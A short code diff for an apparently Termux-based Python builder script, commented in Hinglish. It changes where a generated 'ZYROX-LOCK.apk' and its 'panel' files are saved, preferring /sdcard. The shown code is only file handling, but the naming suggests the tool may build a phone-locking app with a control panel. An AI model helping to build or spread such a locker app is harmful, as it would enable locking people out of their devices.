@@ -303,8 +303,13 @@ def main():
     except Exception as e:
         print(f"{C['Y']}⚠ index.html nahi ban paya: {e}{C['N']}")
 
-    # v9: output folder — APK + panel ek jagah, dhoondhna aasaan
-    outdir = os.path.join(os.getcwd(), f"ZYROX-LOCK-{VERSION}")
+    # v9: output folder — SD card pe (file manager/MT Manager me aasaani se mile)
+    # termux-setup-storage ke baad /sdcard writable hota hai; nahi to cwd fallback
+    sd = "/sdcard"
+    base = sd if (os.path.isdir(sd) and os.access(sd, os.W_OK)) else os.getcwd()
+    if base == os.getcwd():
+        print(f"{C['Y']}[i]{C['N']} /sdcard nahi mila — pehle {C['B']}termux-setup-storage{C['N']} chalao")
+    outdir = os.path.join(base, f"ZYROX-LOCK-{VERSION}")
     try:
         os.makedirs(outdir, exist_ok=True)
         shutil.copy2(out, os.path.join(outdir, "ZYROX-LOCK.apk"))
